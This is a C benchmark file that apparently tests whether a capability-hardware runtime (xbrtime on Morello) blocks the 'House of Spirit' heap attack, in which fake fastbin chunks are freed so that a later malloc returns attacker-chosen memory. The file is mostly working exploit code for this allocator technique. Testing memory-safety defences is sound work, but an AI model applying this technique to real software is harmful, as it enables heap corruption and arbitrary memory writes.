/*  Benchmark: Heap Manipulation
 *    This vulnerability demonstrates a heap manipulation exploit. It involves artificially
 *    creating a fake chunk. The address of this fake chunk is then assigned to a chunk on 
 *    the heap. When the heap chunk is freed, the fake chunk address get placed onto the tcache.
 *    As a result, a subsequent call to malloc would allocate the artificially created chunk
 */

// https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include "xbrtime_morello.h"

struct fast_chunk {
  size_t prev_size;
  size_t size;
  struct fast_chunk *fd;
  struct fast_chunk *bk;
  char buf[0x20];                   // chunk falls in fastbin size range
};

struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory

void *ptr, *victim;

void* thread_function(void* arg) {
  xbrtime_barrier();

  ptr = malloc(0x30);                 // First malloc
  printf("ptr: %p\n", ptr);

  void *orig_ptr;
  orig_ptr = ptr;

  // Passes size check of "free(): invalid size"
  fake_chunks[0].size = sizeof(struct fast_chunk);  // 0x40
  // Passes "free(): invalid next size (fast)"
  fake_chunks[1].size = sizeof(struct fast_chunk);  // 0x40
  // Attacker overwrites a pointer that is about to be 'freed'
  ptr = (void *)&fake_chunks[0].fd;
  printf("Overwritten ptr: %p\n\n", ptr);
  // fake_chunks[0] gets inserted into fastbin
  free(ptr);
  // Pointer freed
  victim = malloc(0x30); // address returned from malloc

  printf("victim: %p\n", victim);

  if(victim!=orig_ptr)
    printf("Test Failed: Heap manipulation leading to arbitrary memory allocation\n");

  xbrtime_barrier();
  return NULL;
}

int main() {
  xbrtime_init();
  
  int num_pes = xbrtime_num_pes();

  printf("Starting test: Heap manipulation leading to arbitrary memory allocation\n");
  for( int i = 0; i < num_pes; i++ ){
    bool check = false;
    check = tpool_add_work( threads[i].thread_queue, 
                            thread_function, 
                            (void*)i);
  }

  xbrtime_close();

  return 0;
}
